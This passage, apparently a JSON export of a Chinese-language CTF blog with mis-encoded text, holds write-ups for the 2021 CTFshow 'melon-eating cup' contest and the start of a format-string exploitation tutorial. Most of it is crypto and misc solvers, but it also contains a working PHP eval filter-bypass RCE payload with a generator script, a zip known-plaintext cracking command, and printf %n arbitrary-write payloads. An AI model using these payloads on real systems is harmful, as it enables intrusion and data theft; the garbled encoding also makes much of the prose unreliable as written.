å³GWHT&#123;W3lCom3_t0_M!sc&#125;ï¼ŒæŒ‰ç¾¤æç¤ºæ¢ä¸ºSangfor&#123;W3lCom3_t0_M!sc&#125;ã€‚ â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"CTFshow åƒç“œæ¯","slug":"match-CTFshow-åƒç“œæ¯","date":"2021-08-16T11:22:00.000Z","updated":"2021-08-16T12:32:10.014Z","comments":true,"path":"2021/08/16/match-CTFshow-åƒç“œæ¯/","permalink":"https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"","text":"â€‹ æ¯”èµ›åç§°ï¼šctfshow åƒç“œæ¯é¢˜ç›®èŒƒå›´ï¼šweb pwn re misc cryptoé¢˜ç›®éš¾åº¦ï¼šæ€ä¹ˆç®€å•æ€ä¹ˆæ¥æ¯”èµ›å¥–åŠ±ï¼šctfshowå®šåˆ¶é¼ æ ‡å«æˆ–èŒå¦¹æ‰‹åŠæ¯”èµ›æ—¶é—´ï¼š2021å¹´8æœˆ14æ—¥(å‘¨å…­) æ™š 7ç‚¹7åˆ†æ¯”èµ›æ—¶é•¿ï¼š48å°æ—¶æ¯”èµ›åœ°å€ï¼šhttps://ctf.show/challenges MISCMiscæ¸¸æˆç­¾åˆ° è¿æ°”ä¸ç­–ç•¥è¿æ°”çš„æ¸¸æˆã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¬¬ä¸€å±€å‡ºç°å¿…è¾“çš„æƒ…å†µæ˜¯æ­£å¸¸çš„ï¼Œå¹¶ä¸”æ¦‚ç‡è¾ƒä½ï¼Œè¿™èƒ½è¡¨æ˜æ‚¨åœ¨ä¸ƒå¤•è¿™ä¸ªèŠ‚æ—¥çœŸçš„éå¸¸æ¬§ï¼Œè¿™è¾¹å»ºè®®å»æŠ½å¡ã€‚æ‰€ä»¥è¯´æœ¬é¢˜æ²¡æœ‰ç­–ç•¥ï¼Œåªæœ‰è¿æ°”ã€‚ åœ°å€ï¼š ç§»æ­¥å»å¤‡ç”¨é¢˜,flagå°±åœ¨è¿™äº¤ è¿æ°”æ¸¸æˆï¼Œå†™ä¸ªå¾ªç¯è„šæœ¬è·‘å‡ºåˆ†æ®µflagã€‚ â€‹ Dinner of Cyanogenç»™äº†ä¸¤ä¸ªdocxï¼Œä¸€ä¸ªæœªåŠ å¯†ï¼Œå¦ä¸€ä¸ªåŠ å¯†ã€‚ åœ¨æœªåŠ å¯†docxå¾—åˆ°flagç¬¬ä¸€æ®µï¼› å‘ç°å…¶ä¸­çš„ [Content_Types].xml å¤§å°ç›¸åŒï¼Œä¸Šæ˜æ–‡æ”»å‡»ï¼š rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot; å¾—åˆ°3-keyï¼Œå†ç”¨7zå·¥å…·è§£å‹ï¼š 7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout åœ¨ flag.xml å¾—åˆ°flagç¬¬äºŒæ®µï¼› åœ¨ word.xml åˆ†åˆ«ç”¨0/1ä»£æ›¿Wingdingsä¸¤ç§å­—ä½“ï¼Œè½¬å­—ç¬¦ä¸²å¾—åˆ°flagç¬¬ä¸‰æ®µã€‚ â€‹ xlçš„æœ¬è´¨Excel 2007ï¼ˆ.xlsxï¼‰æ–‡ä»¶æœ¬è´¨æ˜¯å‹ç¼©åŒ…ã€‚ æ–°å»ºä¸€ä¸ªexcelï¼Œæ’å…¥ç»˜å›¾ï¼Œä¿å­˜é€€å‡ºã€‚ æ›¿æ¢å…¶ä¸­ xl/drawing ç›®å½•ä¸‹çš„ drawing.xml ä¸ºé¢˜ç›®ç»™çš„xmlæ–‡ä»¶ï¼Œå†æ‰“å¼€xlsxæ–‡ä»¶çœ‹åˆ°flagå›¾ç‰‡ã€‚ â€‹ åƒç“œjpgæ”¹ä¸ºzipè§£å‹ï¼Œæ–‡ä»¶ä¸ºbase64å›¾ç‰‡ï¼Œæµè§ˆå™¨æ‰“å¼€å¾—åˆ°äºŒç»´ç ï¼Œæ‰«ç å¾—æ …æ å¯†ç ï¼Œæšä¸¾æ æ•°ï¼ˆæ æ•°=2ï¼‰è§£å¯†å¾—flagã€‚ â€‹ é­”ç‹ éœ€è¦è‡ªå·±åŒ…ä¸Šctfshow{} é¢˜ç›®æœ‰å¾ˆå¤šè¯¯å¯¼ï¼Œå°å¿ƒç‚¹å“¦ w3xä¸ºé­”å…½äº‰éœ¸åœ°å›¾æ–‡ä»¶ï¼Œç›´æ¥æ‰¾åˆ°åœ°å›¾æŸ¥çœ‹å·¥å…· War3 Model Editorï¼Œæ‰¾åˆ°flagå­—ç¬¦ä¸²ã€‚ â€‹ CRYPTOé—ªç”µäº”è¿é­Â·ä¸€é­ æœ‹å‹ä»¬å¥½ã€‚ ä»Šå¤©ï¼Œå’Œå¤§å®¶ï¼Œæ¢è®¨ä¸€ä¸‹ï¼Œæ€æ ·æ‰“RSAç½®æ¢é—ªç”µé­ã€‚ è¦åšåˆ°ä¸‰ç‚¹ã€‚ ä¸€ï¼šè¦åšåˆ°é—®é¢˜çœŸæ­£çš„æ”¾æ¾ã€‚ä½†æ˜¯çº¿æ€§ä»£æ•°åŸºæœ¬çŸ¥è¯†è¦ç”¨å¥½ã€‚è¿™é‡Œé¢ï¼Œè¯¥æ¾çš„æ¾ï¼Œè¯¥ç´§çš„ç´§ã€‚æ¾ä¸­æœ‰ç´§ï¼Œç´§ä¸­æœ‰æ¾ã€‚è¿™ä¸ªé—®é¢˜éå¸¸å¤æ‚ï¼Œåœ¨è¿™é‡Œä¸å¤šè¯´ã€‚åœ¨é—®é¢˜çš„æè¿°ä¸­æœ‰è¯¦ç»†çš„è§£é‡Šï¼› äºŒï¼šè¦ç»ƒå¥½å†…åŠŸï¼Œä½ æ‰èƒ½ä»£ç ä¸­å‘åŠ›ï¼Œæ‰“å‡ºRSAç½®æ¢åŠ²å„¿ã€‚æ…¢ç»ƒï¼Œè¿™æ˜¯ç­¾åˆ°çš„â€¦â€¦å¿«ç»ƒï¼ä¸‹åˆä¸Šå¼€ï¼Œä¸Šåˆä¸‹å¼€ï¼æ‰€ä»¥ï¼Œè¿™ä¸ªRSAç½®æ¢åŠ²å„¿å•Šâ€¦â€¦è¿™ä¸ªRSAå’Œç½®æ¢éƒ½åœ¨åŠ¨å•Šâ€¦â€¦ ä¸‰ï¼šè¦ç”¨é«˜ç»´çš„RSAç½®æ¢åŠ²å„¿ï¼Œæ‰èƒ½æ‰“å‡ºRSAç½®æ¢é—ªç”µé­ã€‚å› ä¸ºè¿™ä¸ªé­çš„åŠ²å„¿ï¼Œä½ çœ‹â€¦â€¦æ˜¯ä¸æ˜¯ï¼Œä½ çœ‹â€¦â€¦éƒ½æ˜¯é«˜ç»´çš„å•Šâ€¦â€¦ ä¸‹é¢æˆ‘æ‰“ä¸€ä¸ªè¿äº”é­å•Šâ€¦â€¦æ‰“äº†äº”é­ï¼šä¸€é­ï¼Œä¸¤é­ï¼Œä¸‰é­ï¼Œå››é­ï¼Œäº”é­ã€‚è¿™äº”é­è¦è¿æ¬¡æ‰“ï¼Œä½ çœ‹ï¼šå®æˆ˜æ—¶é—´ï¼Œä¸€å®šè¦åŠ¨æ­¦ï¼Œå…¨èº«æ¾å¥½ï¼Œç”¨é«˜ç»´çš„åŠ²ï¼ŒRSAç½®æ¢åŠ²å„¿ï¼æ‰èƒ½æ‰“å‡ºflagï¼Œæ‰“å‡ºRSAç½®æ¢é—ªç”µé­ï¼ è°¢è°¢æœ‹å‹ä»¬ã€‚ 1234567import gmpy2n = 8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719c = 6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231d = gmpy2.invert(3, euler_phi(n))m = pow(c, d, n)bytes.fromhex(hex(m)[2:]) â€‹ é—ªç”µäº”è¿é­Â·äºŒé­12345678910111213141516171819202122import randomimport gmpy2random.seed(0x36D)n = 3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647Zn = Zmod(n)P = PermutationGroupElement(&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;)P = Matrix(Zn, P.matrix())A = Matrix(Zn, 36, 36, lambda x, y: random.randint(0, 0x36D))B = A * P * A^-1c = [...]C = []for i in range(36): C.append(c[i*36:(i+1)*36])C = Matrix(Zn, C)B_inv = B^3C_new = C / B_invcc = C_new[0][0]d = gmpy2.invert(3, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) â€‹ é—ªç”µäº”è¿é­Â·ä¸‰é­123456789101112# BB = B^3# BB_inv = BB^(-1)# CC = C * BB_invimport gmpy2n = 25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203cc = 2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730cc = (cc * gmpy2.invert(36, n)) % nd = gmpy2.invert(3, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) â€‹ é—ªç”µäº”è¿é­Â·å››é­12345678910111213# BB = B^17# BB_inv = BB^(-1)# CC = C * BB_inv# I.trace() = 88import gmpy2n = 8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993cc = 5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810cc = (cc * gmpy2.invert(88, n)) % nd = gmpy2.invert(17, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) â€‹ å¤§é¸Ÿè½¬è½¬è½¬ ä¸ºå“åº”ç¾¤ä¸»â€œæ€ä¹ˆç®€å•æ€ä¹ˆæ¥â€çš„å·å¬ï¼Œç‰¹è¡¥ä¸Šä¸€é“å¤å…¸å¯†ç ã€‚ æ˜æ–‡å¯†æ–‡éƒ½æ˜¯å¤§å†™å­—æ¯ã€‚ è¯·è§£å‡ºæ­£ç¡®çš„æ˜æ–‡åï¼ŒæŠŠæ˜æ–‡è½¬æ¢æˆå°å†™ï¼Œå¹¶åŠ ä¸Šæ ¼å¼æ‰€åŒ…å«çš„èŠ±æ‹¬å·ã€‚ Engimaå¯†ç æœºã€‚ pythonååºåˆ—åŒ–ï¼š 12345import picklex = pickle.load(open(&#x27;nimage.pickle&#x27;, &#x27;rb&#x27;))print(x)#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125; å°è¯•ç”¨å…¨è„šæœ¬è§£å¯†å¾—åˆ°çš„ç»“æœæœ‰é—®é¢˜ï¼Œå†ç”¨pycipherå·¥å…·è§£å¯†ï¼š 12345678910111213from pycipher import Enigmaimport stringdic = string.ascii_uppercasefor x in dic: for y in dic: for z in dic: eng = Enigma(settings=(&#x27;W&#x27;,&#x27;Y&#x27;,&#x27;F&#x27;),rotors=(1,2,3),reflector=&#x27;B&#x27;, ringstellung=(x,y,z),steckers=[(&#x27;W&#x27;,&#x27;O&#x27;),(&#x27;D&#x27;,&#x27;E&#x27;), (&#x27;J&#x27;,&#x27;B&#x27;),(&#x27;H&#x27;,&#x27;N&#x27;),(&#x27;X&#x27;,&#x27;I&#x27;)]) flag = eng.decipher(&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;) if flag.startswith(&#x27;CTFSHOW&#x27;): print((x,y,z),flag.lower()) â€‹ REVERSETea_tube_pot ä¸‰ç‚¹å‡ åšŸï¼Œé¥®èŒ¶å…ˆå•¦ï¼ï¼ˆç»™å¤§ä½¬é€’èŒ¶.jpgï¼‰ flagåˆ†ä¸‰éƒ¨åˆ†ã€‚ ç¬¬ä¸€éƒ¨åˆ† TEAåŠ å¯†ï¼š 1234567891011121314151617181920212223242526def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = [0x5FD744F6,0x95832046] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] decrypted = decrypt(encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1])# ENCrT1ny ç¬¬äºŒéƒ¨åˆ† XTEAåŠ å¯†ï¼š 1234567891011121314151617181920212223def decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = [0xFD731313, 0x6662CB90] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] rounds = 32 decrypted = decrypt(rounds, encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1]) # yPti0nA1 ç¬¬ä¸‰éƒ¨åˆ† XXTEAåŠ å¯†ï¼š 123456789101112131415161718192021222324252627def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: encrypted = [0x4B136C82, 0x1A6E9613] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] decrypted = decrypt(encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1]) # 9ori7hM! â€‹ PWNwuqianROP x64ç­¾åˆ°ã€‚ç„¶åç­¾é€€ã€‚ â€‹ WEBçƒ­èº« æœ€ç®€å•çš„ç­¾åˆ° 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; å…«è¿›åˆ¶ç»•è¿‡ï¼Œå‰é¢åŠ ä¸ªå­—ç¬¦ï¼š?num=%0a010574ã€‚ â€‹ shellme è¿˜æ˜¯ç†Ÿæ‚‰çš„æ„Ÿè§‰ phpinfoé¡µé¢ç›´æ¥æœflagï¼Œå¾ˆç†Ÿæ‚‰ã€‚ â€‹ shellme_Revenge ç”±äºä¸Šä¸ªé¢˜æœ‰ä¸¥é‡çš„éé¢„æœŸï¼Œæˆ‘çš„é”…ï¼Œåœ¨æ­¤ç»™å¸ˆå‚…ä»¬é“æ­‰äº† cookie çœ‹åˆ° hint=looklookï¼Œè®¿é—® ?looklook=1 å¾—åˆ°æºç ï¼š 123456789101112131415161718192021&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; ç¦ç”¨äº†å¾ˆå¤š RCE ç»•è¿‡å§¿åŠ¿ï¼Œæœªç¦ç”¨ $+_;?()[]&lt;&gt;ã€å­—æ¯C å’Œæ•°å­—0-3ï¼Œå°è¯•ç”¨æˆªæ–­è¾“å‡ºå†…å®¹ï¼Œç”¨PHPè‡ªå¢ç‰¹æ€§ç”Ÿæˆå…¶ä»–å­—æ¯ï¼š 12345$_=[];?&gt;&lt;?=$_ //çœŸArray$_=([].C);?&gt;&lt;?=$_ //å­—ç¬¦ä¸²ArrayC$_=([].C)[3];?&gt;&lt;?=$_ //å­—æ¯a$_=([].C)[3];$_++;?&gt;&lt;?=$_ //å­—æ¯b...... æ ¹æ®PHPæ‹¼æ¥ç‰¹æ€§ï¼Œå°†éœ€è¦çš„å…³é”®å­—æ‹†åˆ†æˆå­—æ¯ï¼Œç”¨è‡ªå¢ç‰¹æ€§ç”Ÿæˆï¼ŒæŒ‰ç…§å­—æ¯åºç”Ÿæˆå¯èŠ‚çœpayloadé•¿åº¦ã€‚ payloadç”Ÿæˆè„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132# payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);alpha = list(set(need))alpha.sort()print(alpha)greece = &#x27;Î± Î² Î³ Î´ Îµ Î¶ Î½ Î¾ Î¿ Ï€ Ï Ïƒ Î· Î¸ Î¹ Îº Î» Î¼ Ï„ Ï… Ï† Ï‡ Ïˆ Ï‰ Î“ Î”&#x27;.split(&#x27; &#x27;)out = &#x27;$_=C;&#x27;cnt = ord(&#x27;C&#x27;)for k in alpha: if ord(k)-ord(&#x27;C&#x27;) in range(26): now_php = &#x27;&#x27; for i in range(ord(k)-cnt): now_php += &#x27;$_++;&#x27; cnt += 1 icon = greece[ord(k)-ord(&#x27;C&#x27;)] now_php += f&#x27;$&#123;icon&#125;=$_;&#x27; out += now_phpfunc = []for k in need: if ord(k)-ord(&#x27;C&#x27;) in range(26): icon = greece[ord(k)-ord(&#x27;C&#x27;)] func += [f&#x27;$&#123;icon&#125;&#x27;] else: func += [k]func = &#x27;.&#x27;.join(func)print(func)payload = f&#x27;&#123;out&#125;?&gt;&lt;?=($&#123;&#123;_.&#123;func&#125;&#125;&#125;[0])($&#123;&#123;_.&#123;func&#125;&#125;&#125;[1]);&#x27;print(payload) POSTï¼š 12ctf_show = $_=([].C)[3];$Î±=$_;$_++;$_++;$_++;$_++;$Îµ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$Ïƒ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$Ï‡=$_;$Î²=$Îµ.$Ï‡.$Î±.$Ïƒ;$_=C;$_++;$_++;$Î³=$_;$_++;$_++;$Îµ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$Î¼=$_;($&#123;_.$Îµ.$Î³.$Î¼&#125;[0])($&#123;_.$Îµ.$Î³.$Î¼&#125;[1]); GET: ?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"pwn-æ ¼å¼åŒ–å­—ç¬¦ä¸²","date":"2021-08-08T10:23:45.000Z","updated":"2023-11-10T11:59:47.580Z","comments":true,"path":"2021/08/08/pwn-æ ¼å¼åŒ–å­—ç¬¦ä¸²/","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"â€‹ æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚ æ ¹æœ¬åŸå› æ˜¯è°ƒç”¨ printf å‡½æ•°æ—çš„æ—¶å€™ï¼Œå› ä¸ºæ ¼å¼å­—ç¬¦ä¸²è¦æ±‚çš„å‚æ•°ä¸ªæ•°å’Œå®é™…çš„å‚æ•°æ ¼å¼ä¸åŒ¹é…å¯¼è‡´å»å †æ ˆä¸­å–æ•°æ®ï¼Œå¯¼è‡´æ³„æ¼å‡ºå †æ ˆæ•°æ®ã€‚ â€‹ æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºæœ¬æ ¼å¼ï¼š%[parameter][flags][field width][.precision][length]type å‚æ•°ï¼ˆparameterï¼‰ n$ï¼šè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•° é•¿åº¦ï¼ˆlengthï¼‰ hhï¼šè¾“å‡ºä¸€ä¸ªå­—èŠ‚ hï¼šè¾“å‡ºä¸€ä¸ªåŒå­—èŠ‚ ç±»å‹ï¼ˆtypeï¼‰ d/iï¼šæœ‰ç¬¦å·æ•´æ•° uï¼šæ— ç¬¦å·æ•´æ•° x/Xï¼š16è¿›åˆ¶æ— ç¬¦å·æ•´æ•° oï¼š8è¿›åˆ¶æ— ç¬¦å·æ•´æ•° sï¼šå­—ç¬¦ä¸² pï¼šè½¬æ¢ä¸ºå¯æ‰“å°å­—ç¬¦çš„æŒ‡é’ˆå€¼ nï¼šä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚ â€‹ åˆ©ç”¨æ³„éœ²å†…å­˜%nx / %npï¼šæŒ‰é¡ºåºæ³„éœ²æ ˆæ•°æ® %sï¼šè·å–å˜é‡åœ°å€å†…å®¹ï¼Œé‡é›¶æˆªæ–­ %n$x / %n$p / %n$sï¼šè·å–æŒ‡å®šç¬¬nä¸ªå‚æ•°çš„å€¼æˆ–å­—ç¬¦ä¸² addr%X$pï¼šæ³„éœ²ä»»æ„åœ°å€çš„æ•°æ®ï¼ˆaddrä¸ºè¦æ³„éœ²çš„åœ°å€ï¼‰ â€‹ è¦†ç›–å†…å­˜%Yc%X$nï¼šå°†Yå†™å…¥æ ˆä¸Šç¬¬Xä¸ªä½ç½®æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ï¼ˆYä¸ºè¦å†™å…¥çš„æ•°æ®ï¼ŒXä¸ºä»»æ„æ­£æ•´æ•°ï¼‰ addr%(Y-4)c%X$nï¼šå‘ä»»æ„åœ°å€å†™ï¼ˆaddrä¸ºè¦å†™å…¥çš„åœ°å€ï¼‰ æ ˆåœ°å€è¦†ç›–ä¾‹ï¼šæŠŠcçš„å€¼ä»789æ”¹å†™ä¸º16ã€‚ c_addr å 4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥é¢å¤–åŠ ä¸Š12ä¸ªå­—èŠ‚ï¼Œæœ€ç»ˆå‘ c_addr æŒ‡å‘çš„ç©ºé—´èµ‹å€¼16ï¼š payload = p32(c_addr) + b&#39;%12c&#39; + b&#39;%6$n&#39; å°æ•°è¦†ç›–ä¾‹ï¼šæŠŠaçš„å€¼æ”¹å†™ä¸º2ã€‚ å¦‚æœè¿˜ç”¨ä¹‹å‰çš„æ–¹å¼ï¼Œå†™å…¥çš„åœ°å€æœ€å°‘è¦å 4ä½ï¼Œå› æ­¤æœ€å°åªèƒ½èµ‹å€¼4ï¼Œå°è¯•æŠŠåœ°å€æ”¾åˆ°åé¢çš„ä½ç½®ã€‚ èµ‹å€¼2ï¼Œè¦å†™ä½œaa%X$n, æŠŠ2èµ‹å€¼ç»™ç¬¬Xä¸ªä½ç½®æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ã€‚è¿™ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸º6ï¼Œä¸æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥è¿˜è¦è¡¥å…¨ä¸¤ä¸ªå­—ç¬¦ï¼Œå†åŠ ä¸Šaçš„åœ°å€ã€‚è¿™æ ·æœ€ç»ˆaæ˜¯è½åœ¨äº†æ ˆä¸Šç¬¬8ä¸ªä½ç½®ï¼š payload = b&#39;aa%8$nbb&#39; + p32(a_addr) å¤§æ•°è¦†ç›–ä¾‹ï¼šæŠŠbçš„å€¼æ”¹å†™ä¸º0x12345678ã€‚ éœ€è¦èµ‹å€¼ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè¿™æ—¶å€™ç›´æ¥å‘æ ˆä¸­å†™å…¥è¿™ä¹ˆå¤šçš„æ•°æ®è‚¯å®šä¸å¤ªæ–¹ä¾¿ã€‚åˆ©ç”¨ hhï¼ˆå•å­—èŠ‚ï¼‰ å’Œ hï¼ˆåŒå­—èŠ‚ï¼‰ å‚æ•°é€å­—èŠ‚å†™å…¥ã€‚ ä»¥å•å­—èŠ‚çš„æ–¹å¼å†™å…¥ï¼Œè‹¥bçš„åœ°å€æ˜¯ 0x0804c028ï¼Œé€å­—èŠ‚å†™å…¥åçš„æ•°æ®åˆ†é…åº”è¯¥å¦‚ä¸‹æ‰€ç¤ºï¼š 12340x0804c028 \\x780x0804c029 \\x560x0804c02a \\x340x0804c02b \\x12 å› æ­¤éšç€æ„é€ payloadï¼Œå­—ç¬¦ä¸²é•¿åº¦æ˜¯é€æ¸å¢é•¿çš„ï¼Œå› æ­¤è¦æŒ‰ç…§ä»å°åˆ°å¤§çš„é¡ºåºå¡«å……å­—èŠ‚ï¼Œè¿™é‡Œè¦ä»é«˜ä½å‘åœ°ä½å¡«å……ï¼š payload = p32(0x0804c02b) + b&#39;a&#39;*(0x12 - 4) + b&#39;%6$hhn&#39; ï¼ˆå½“å‰æ€»é•¿åº¦=24ï¼Œå­—ç¬¦é•¿åº¦0x12ï¼‰ ä¸‹é¢å¡«å……æ¬¡é«˜ä½ã€‚å¡«å……åé¢çš„æ—¶å€™è¦æ³¨æ„ï¼Œå› ä¸ºè¿™æ˜¯ä¸€æ¬¡å‘é€çš„payloadï¼Œå› æ­¤å¡«å……åé¢çš„æ—¶å€™ï¼Œå‰é¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¹Ÿè¦ç®—ä¸Šï¼Œå‰é¢çš„å­—ç¬¦ä¸²é•¿åº¦å·²ç»æœ‰24ä¸ªå­—èŠ‚ï¼Œå› æ­¤æ¬¡é«˜ä½çš„åœ°å€ä¼šå†™å…¥ç¬¬25-28ä¸ªå­—èŠ‚ï¼Œè¿™æ ·å¯¹åº”çš„å°±æ˜¯æ ˆä¸­çš„ç¬¬12ä¸ªä½ç½®ï¼ˆ24/4 + 6ï¼‰ã€‚ æ„é€ æ¬¡é«˜ä½çš„å­—ç¬¦ä¸²æ—¶è¦æ³¨æ„ä¸èƒ½åŒ…æ‹¬ %6$hhn çš„é•¿åº¦ï¼Œå› æ­¤æ¥ä¸‹æ¥è¿˜è¦å¡«å……çš„å­—ç¬¦ä¸²ä¸ªæ•°æ˜¯ æ¬¡é«˜å­—èŠ‚éœ€è¦çš„æ€»å­—èŠ‚æ•° - å¡«å……ä¸Šä¸€å­—èŠ‚å·²ç»æ„é€ çš„å­—èŠ‚æ•° - æ¬¡é«˜å­—èŠ‚åœ°å€ä½æ•°ã€‚æ¬¡é«˜åœ°å€è¿™é‡Œåç»­è¿˜æœ‰payloadè¦å¡«å……ï¼Œç”±äºè¦åœ°å€å¯¹é½ï¼Œå› æ­¤æ·»åŠ ä¸‰ä¸ªbï¼Œä½¿å¾—æ€»é•¿åº¦ä¸º4çš„å€æ•°ï¼š payload += p32(0x0804c02a) + 